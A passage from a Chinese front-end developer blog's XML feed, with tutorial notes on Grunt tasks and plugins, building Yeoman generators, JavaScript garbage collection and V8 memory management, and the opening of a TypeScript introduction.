spellcheck="true">// 标记任务失败</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'bad'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello grunt bar'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">false</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt bad 会执行失败</span><span class="token punctuation">}</span></code></pre><p><strong><code>initConfig</code>方法</strong></p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> grunt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    grunt<span class="token punctuation">.</span><span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        foo<span class="token punctuation">:</span> <span class="token punctuation">{</span>            bar<span class="token punctuation">:</span> <span class="token number">123</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>grunt<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token string">'foo.bar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt foo 输出 123</span><span class="token punctuation">}</span></code></pre><p><strong>多目标任务</strong></p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> grunt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  grunt<span class="token punctuation">.</span><span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    build<span class="token punctuation">:</span> <span class="token punctuation">{</span>      options<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 配置选项</span>        foo<span class="token punctuation">:</span> <span class="token string">'bar'</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      css<span class="token punctuation">:</span> <span class="token punctuation">{</span>        options<span class="token punctuation">:</span> <span class="token punctuation">{</span>          foo<span class="token punctuation">:</span> <span class="token string">'baz'</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      js<span class="token punctuation">:</span> <span class="token string">'2'</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 多目标模式，可以让任务根据配置形成多个子任务</span>  grunt<span class="token punctuation">.</span><span class="token function">registerMultiTask</span><span class="token punctuation">(</span><span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`target: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">, data: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// grunt build</span><span class="token comment" spellcheck="true">// 输出</span>Running <span class="token string">"build:css"</span> <span class="token punctuation">(</span>build<span class="token punctuation">)</span> task<span class="token punctuation">{</span> foo<span class="token punctuation">:</span> <span class="token string">'baz'</span> <span class="token punctuation">}</span>target<span class="token punctuation">:</span> css<span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token punctuation">[</span>object Object<span class="token punctuation">]</span>Running <span class="token string">"build:js"</span> <span class="token punctuation">(</span>build<span class="token punctuation">)</span> task<span class="token punctuation">{</span> foo<span class="token punctuation">:</span> <span class="token string">'bar'</span> <span class="token punctuation">}</span>target<span class="token punctuation">:</span> js<span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token number">2</span>Done<span class="token punctuation">.</span></code></pre><p><strong>插件使用：clean插件删除文件</strong></p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> grunt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    grunt<span class="token punctuation">.</span><span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        clean<span class="token punctuation">:</span> <span class="token punctuation">{</span>            temp<span class="token punctuation">:</span> <span class="token string">'temp/**'</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    grunt<span class="token punctuation">.</span><span class="token function">loadNpmTasks</span><span class="token punctuation">(</span><span class="token string">'grunt-contrib-clean'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// grunt clean 可删除temp下对应文件</span></code></pre><ul><li>grunt-sass</li><li>grunt-babel</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> sass <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'sass'</span><span class="token punctuation">)</span><span class="token keyword">const</span> loadGruntTasks <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'load-grunt-tasks'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> grunt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  grunt<span class="token punctuation">.</span><span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    sass<span class="token punctuation">:</span> <span class="token punctuation">{</span>      options<span class="token punctuation">:</span> <span class="token punctuation">{</span>        sourceMap<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 生成map文件</span>        implementation<span class="token punctuation">:</span> sass      <span class="token punctuation">}</span><span class="token punctuation">,</span>      main<span class="token punctuation">:</span> <span class="token punctuation">{</span>        files<span class="token punctuation">:</span> <span class="token punctuation">{</span>          <span class="token string">'dist/css/main.css'</span><span class="token punctuation">:</span> <span class="token string">'src/scss/main.scss'</span> <span class="token comment" spellcheck="true">// 目录</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    babel<span class="token punctuation">:</span> <span class="token punctuation">{</span>      options<span class="token punctuation">:</span> <span class="token punctuation">{</span>        sourceMap<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        presets<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'@babel/preset-env'</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      main<span class="token punctuation">:</span> <span class="token punctuation">{</span>        files<span class="token punctuation">:</span> <span class="token punctuation">{</span>          <span class="token string">'dist/js/app.js'</span><span class="token punctuation">:</span> <span class="token string">'src/js/app.js'</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    watch<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 监听</span>      js<span class="token punctuation">:</span> <span class="token punctuation">{</span>        files<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'src/js/*.js'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        tasks<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'babel'</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      css<span class="token punctuation">:</span> <span class="token punctuation">{</span>        files<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'src/scss/*.scss'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        tasks<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'sass'</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// grunt.loadNpmTasks('grunt-sass')</span>  <span class="token function">loadGruntTasks</span><span class="token punctuation">(</span>grunt<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 自动加载所有的 grunt 插件中的任务</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'default'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'sass'</span><span class="token punctuation">,</span> <span class="token string">'babel'</span><span class="token punctuation">,</span> <span class="token string">'watch'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 首先执行 sass, babel 任务，再监听</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yeoman脚手架工具</title>
      <link href="2020/08/28/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-%E5%B7%A5%E7%A8%8B%E5%8C%96%E4%B8%8E%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
      <url>2020/08/28/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-%E5%B7%A5%E7%A8%8B%E5%8C%96%E4%B8%8E%E8%84%9A%E6%89%8B%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="工程化和脚手架的理解"><a href="#工程化和脚手架的理解" class="headerlink" title="工程化和脚手架的理解"></a>工程化和脚手架的理解</h2><p>谈谈你对工程化的初步认识？</p><blockquote><p>前端工程化我认为可以提高开发效率，提高代码质量，简便流程。</p><p>就目前公司所做的项目来说，工程化所带来的优点是，无论从项目的编码到编译，打包到部署，都十分方便和规范，对开发人员特别友好。</p></blockquote><p>你认为脚手架除了为我们创建项目结构，还有什么更深的意义？</p><blockquote><p>我觉得脚手架是帮我们减少「为减少重复性工作而做的重复性工作」的工具，只需要几行命令，目录结构，脚本，配置等等都已经搞好了，我们只需要写核心代码就好，而不用关心其他重复性的事情。</p></blockquote><h2 id="yeoman"><a href="#yeoman" class="headerlink" title="yeoman"></a>yeoman</h2><p>在谈论脚手架时，我们想到的都是<code>vue-cli</code>等比较集成的脚手架，而Yeoman是一种通用的工具，便于创建属于自己的脚手架，很值得学习。</p><blockquote><p>Yeoman主要有三部分组成：yo（脚手架工具）、grunt（构建工具）、bower（包管理器）。这三个工具是分别独立开发的，但是需要配合使用，来实现我们高效的工作流模式。 </p></blockquote><p>安装：<code>cnpm install -g yo grunt-cli bower</code></p><p>安装后在命令行中输入 yo，在这里显示的是我的系统中已经安装的generator的库</p><p>可以选择<code>install generator</code>，然后搜索我们想安装的generator，比如webapp，然后安装即可。</p><hr><p>现在我们要使用<code>generator-node</code>：creates a base template to start a new Node.js module.</p><p>直接运行<code>yo node</code>，则会直接在文件夹中创建好目录结构</p><h3 id="sub-generator"><a href="#sub-generator" class="headerlink" title="sub-generator"></a>sub-generator</h3><p>如果不需要生成整个项目结构，只需生成ESLint等配置文件，就可以用sub-generator,用<code>:</code>来表示</p><p><code>yo node:cli</code>：其中的<code>cli</code>就是子集生成器</p><h3 id="总结一下使用步骤"><a href="#总结一下使用步骤" class="headerlink" title="总结一下使用步骤"></a>总结一下使用步骤</h3><ol><li>明确需求</li><li>找到合适的Generator</li><li>全局范围安装找到的Generator</li><li>通过Yo运行对应的Generator</li><li>通过命令行交互填写选项</li><li>生成你所需要的项目结构</li></ol><h3 id="自定义Generator来搭建自己的脚手架"><a href="#自定义Generator来搭建自己的脚手架" class="headerlink" title="自定义Generator来搭建自己的脚手架"></a>自定义Generator来搭建自己的脚手架</h3><p>比如用<code>vue-cli</code>创建项目时，并没有<code>vue-router,vuex</code>等，需要手动引入，如果把这些也放入脚手架中就很方便</p><p>首先使用<code>npm init</code>初始化一个<code>package.json</code>文件</p><p>安装<code>cnpm install yeoman-generator</code>,提供了生成器的基类</p><p>Generator的一个基本结构如下</p><blockquote><p>|- generators/……….生成器目录<br>|-    app/…………..默认生成器目录<br>|-       index.js…….默认生成器实现<br>|-    templates/foo.txt..模板文件<br>|-package.json……….模块包配置文件</p><p>其中的index.js是作为Generator 的核心入口</p><p>需要导出一个继承自 Yeoman Generator 的类型</p><p>Yeoman Generator 在工作时会自动调用此类型定义的方法</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> Generator <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'yeoman-generator'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">class</span> <span class="token class-name">extends</span> Generator <span class="token punctuation">{</span>    writing <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Yeoman 自动在生成文件阶段调用此方法</span>        <span class="token comment" spellcheck="true">// 我们尝试往项目目录中写入文件</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>fs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">destinationPath</span><span class="token punctuation">(</span><span class="token string">'temp.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 还可以通过模板方式写入文件到目标目录</span>        <span class="token comment" spellcheck="true">// 模板文件路径</span>        <span class="token keyword">const</span> tmpl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">templatePath</span><span class="token punctuation">(</span><span class="token string">'foo.txt'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 输出目标路径</span>        <span class="token keyword">const</span> output <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">destinationPath</span><span class="token punctuation">(</span><span class="token string">'foo.txt'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 模板数据上下文</span>        <span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> success<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>fs<span class="token punctuation">.</span><span class="token function">copyTpl</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span> output<span class="token punctuation">,</span> context<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>编写好之后使用<code>npm link</code>使其成为一个全局模块包，这样在别的地方也能使用<code>yo &#39;name&#39;</code>调用这个模块</p><h4 id="使用模板文件"><a href="#使用模板文件" class="headerlink" title="使用模板文件"></a>使用模板文件</h4><pre class=" language-txt"><code class="language-txt">模板文件，支持 EJS 模板标记<%= title %><% if (success) { %>哈哈哈<% } %>title和success在模板上下文中赋值</code></pre><p>之后同样运行<code>yo &#39;name&#39;</code>创建模板文件，如下：</p><blockquote><p>模板文件，支持 EJS 模板标记<br>hello</p></blockquote><h3 id="如何使用命令行交互的方式实现询问用户输入"><a href="#如何使用命令行交互的方式实现询问用户输入" class="headerlink" title="如何使用命令行交互的方式实现询问用户输入"></a>如何使用命令行交互的方式实现询问用户输入</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> Generator <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'yeoman-generator'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">class</span> <span class="token class-name">extends</span> Generator <span class="token punctuation">{</span>    prompting <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>          type<span class="token punctuation">:</span> <span class="token string">'input'</span><span class="token punctuation">,</span>          name<span class="token punctuation">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 命令行需要输入的</span>          message<span class="token punctuation">:</span> <span class="token string">'Your project name'</span><span class="token punctuation">,</span>          <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appname        <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>answers <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>answers <span class="token operator">=</span> answers      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    writing <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 模板文件路径</span>        <span class="token keyword">const</span> tmpl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">templatePath</span><span class="token punctuation">(</span><span class="token string">'bar.html'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 在bar.html中可以写 &lt;h1>&lt;%= name %>&lt;/h1></span>        <span class="token comment" spellcheck="true">// 输出目标路径</span>        <span class="token keyword">const</span> output <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">destinationPath</span><span class="token punctuation">(</span><span class="token string">'bar.html'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 模板数据上下文</span>        <span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>answers <span class="token comment" spellcheck="true">// name传进上下文</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>fs<span class="token punctuation">.</span><span class="token function">copyTpl</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span> output<span class="token punctuation">,</span> context<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="如何创建一个自定义的vue脚手架"><a href="#如何创建一个自定义的vue脚手架" class="headerlink" title="如何创建一个自定义的vue脚手架"></a>如何创建一个自定义的vue脚手架</h3><ul><li>把写好的vue文件目录结构拷贝到<code>templates</code>目录下</li><li>重写<code>writing方法</code>，因为不只是创建单个文件，每一个文件都需要创建</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> Generator <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'yeoman-generator'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">class</span> <span class="token class-name">extends</span> Generator <span class="token punctuation">{</span>    prompting <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>          type<span class="token punctuation">:</span> <span class="token string">'input'</span><span class="token punctuation">,</span>          name<span class="token punctuation">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 命令行需要输入的</span>          message<span class="token punctuation">:</span> <span class="token string">'Your project name'</span><span class="token punctuation">,</span>          <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appname        <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>answers <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>answers <span class="token operator">=</span> answers      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    writing <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> templates <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'a.js'</span><span class="token punctuation">,</span>            <span class="token string">'src/main.js'</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//...需要的文件</span>        <span class="token punctuation">]</span>        templates<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>fs<span class="token punctuation">.</span><span class="token function">copyTpl</span><span class="token punctuation">(</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">templatePath</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">destinationPath</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>answers            <span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GC算法，V8引擎</title>
      <link href="2020/08/26/%E6%B5%8F%E8%A7%88%E5%99%A8-GC%E7%AE%97%E6%B3%95%EF%BC%8CV8%E5%BC%95%E6%93%8E/"/>
      <url>2020/08/26/%E6%B5%8F%E8%A7%88%E5%99%A8-GC%E7%AE%97%E6%B3%95%EF%BC%8CV8%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<ul><li>GC算法</li><li>内存泄露</li><li>内存溢出</li><li>V8引擎</li><li>performance</li></ul><h2 id="GC算法"><a href="#GC算法" class="headerlink" title="GC算法"></a>GC算法</h2><h5 id="1-标记清除"><a href="#1-标记清除" class="headerlink" title="1. 标记清除"></a>1. 标记清除</h5><p>垃圾回收器会在运行时给存储在内存中的所有变量加一个标记，然后去除环境中的变量以及被环境中的变量所引用的变量（闭包）在这些完成后仍存在标记的就是要删除的变量了，因为环境中的变量已经无法访问到这些变量了。缺点是清除的对象可能地址不连续，造成内存碎片化。</p><p>优缺点：1. 可处理循环引用 2. 产生碎片化 3. 不会立即回收</p><h5 id="2-引用计数"><a href="#2-引用计数" class="headerlink" title="2. 引用计数"></a>2. 引用计数</h5><p>引用计数的策略是跟踪记录每个值被使用的次数。当声明了一个变量并将一个引用类型赋值给该变量时，这个值得引用次数就加一，如果该变量的值变成了另一个，则这个值得引用次数就减一，当这个值的引用次数为0的时候，说明没有变量在使用，这个值无法访问。由此可以将其占用的空间回收，这些垃圾回收器就会在运行时清理掉引用次数为0的值占用的空间，但这种方法容易引起内存泄漏，因为这种方式没有解决循环引用的问题，所以不建议使用！例如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span>c<span class="token punctuation">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>o <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//循环引用</span></code></pre><p>优缺点：1.即时回收 2. 减少程序卡顿 3.无法解决循环引用 4. 资源消耗大：维护引用计数器</p><h5 id="3-标记整理"><a href="#3-标记整理" class="headerlink" title="3. 标记整理"></a>3. 标记整理</h5><p>标记清除的升级版，清除之前先整理空间，再清除，防止内存碎片化</p><h2 id="什么情况会引起内存泄漏？"><a href="#什么情况会引起内存泄漏？" class="headerlink" title="什么情况会引起内存泄漏？"></a>什么情况会引起内存泄漏？</h2><p>虽然有垃圾回收机制但是我们编写代码操作不当还是会造成内存泄漏。</p><ul><li>意外的全局变量引起的内存泄漏。</li></ul><p>原因：全局变量，不会被回收。</p><p>解决：使用严格模式避免。</p><ul><li>闭包引起的内存泄漏</li></ul><p>原因：闭包可以维持函数内局部变量，使其得不到释放。</p><p>解决：将事件处理函数定义在外部，解除闭包,或者在定义事件处理函数的外部函数中，删除对dom的引用。</p><ul><li>没有清理的DOM元素引用</li></ul><p>原因：虽然别的地方删除了，但是对象中还存在对dom的引用</p><p>解决：手动删除。</p><ul><li>被遗忘的定时器或者回调</li></ul><p>原因：定时器中有dom的引用，即使dom删除了，但是定时器还在，所以内存中还是有这个dom。</p><p>解决：手动删除定时器和dom。</p><ul><li>子元素存在引用引起的内存泄漏</li></ul><p>原因：div中的ul li  得到这个div，会间接引用某个得到的li，那么此时因为div间接引用li，即使li被清空，也还是在内存中，并且只要li不被删除，他的父元素都不会被删除。</p><p>解决：手动删除清空。</p><h2 id="内存溢出"><a href="#内存溢出" class="headerlink" title="内存溢出"></a>内存溢出</h2><ul><li><p>内存溢出，申请不到足够的内存；</p></li><li><p>内存泄露，无法释放已申请的内存；</p></li></ul><h2 id="V8引擎与垃圾回收策略"><a href="#V8引擎与垃圾回收策略" class="headerlink" title="V8引擎与垃圾回收策略"></a>V8引擎与垃圾回收策略</h2><ul><li>V8采用即时编译</li><li><p>V8内存设限（64操作系统不超过1.5G）</p></li><li><p>采用分代回收的思想</p></li><li>内存分为新生代，老生代</li><li>不同对象采用不同GC算法</li></ul><h3 id="V8内存分配与垃圾回收"><a href="#V8内存分配与垃圾回收" class="headerlink" title="V8内存分配与垃圾回收"></a>V8内存分配与垃圾回收</h3><blockquote><p>V8内存空间一分为二</p><p>小空间用于存储新生代对象（32M | 16M）</p><p>新生代指的是存活时间较短的对象</p><p>新生代内存区分为两个相等空间</p><p>使用空间为From，空闲空间为To</p><p>活动对象存储于From空间</p><p>进行回收时，标记整理将From活动对象拷贝至To，释放From区域</p><p>最后From和To交换空间</p><p>空间换时间</p></blockquote><p>回收过程中可能出现晋升：</p><ul><li>一轮GC还存活的新生代需要晋升到老年代</li><li>To空间使用率超过25%的需要晋升，因为From和To互换后需要保证新活动对象的空间充足</li></ul><blockquote><p>老生代（1.4G | 700M）</p><p>老生代对象就是指存活时间较长的对象</p><p>采用标记清除，标记整理，增量标记</p><p>首先使用标记清除完成垃圾回收</p><p>采用标记整理进行空间优化</p><p>采用增量标记进行效率优化，将标记过程分段，与程序执行交替执行，提高效率（垃圾回收会阻塞程序）</p></blockquote><h2 id="performance"><a href="#performance" class="headerlink" title="performance"></a>performance</h2><p>打开F12中的performance工具，点击录制，输入网址并做一些操作，点击停止就可以看到最后一个图的蓝色线条即是内存变换情况。</p><p><strong>监控内存的方式</strong></p><ul><li>浏览器任务管理器：<code>shift+esc，</code>最后一列可看到JavaScript使用的内存</li><li>Timeline时序图：蓝色线条，在其上面可定位</li><li>堆快照查找分离DOM：F12中的Memory选项，Take snapshot</li><li>判断是否存在频繁的垃圾回收：Timeline和任务管理器去查看</li></ul>]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript</title>
      <link href="2020/08/23/TypeScript-TypeScript/"/>
      <url>2020/08/23/TypeScript-TypeScript/</url>
      
        <content type="html"><![CDATA[<ul><li>强类型和弱类型（类型安全）</li><li>静态类型与动态类型（类型检查）</li><li>Flow：JS类型检查器</li><li>TypeScript快速上手</li><li>TypeScript原始类型</li><li>Object类型，数组类型等</li><li>TypeScript接口与类</li><li>泛型</li></ul><p>学习网址：<a href="https://jkchao.github.io/typescript-book-chinese/" target="_blank" rel="noopener">https://jkchao.github.io/typescript-book-chinese/</a> </p><h2 id="强类型和弱类型"><a href="#强类型和弱类型" class="headerlink" title="强类型和弱类型"></a>强类型和弱类型</h2><p>比如说强类型语言要求实参和形参必须类型一致，弱类型则不会要求</p><p>强类型：不允许随意的隐式类型转换</p><p>弱类型：允许隐式类型转换</p><h2 id="静态类型和动态类型"><a href="#静态类型和动态类型" class="headerlink" title="静态类型和动态类型"></a>静态类型和动态类型</h2><p>静态类型：声明过后，它的类型就不允许再修改</p><p>动态类型：变量的类型可以随时改变</p><blockquote><p>基于以上，所有编程语言分为四类，JS即是弱类型也是动态类型</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//这样写没问题，只有等到运行时才会报错</span><span class="token comment" spellcheck="true">// 如果加了一个时间</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    obj<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 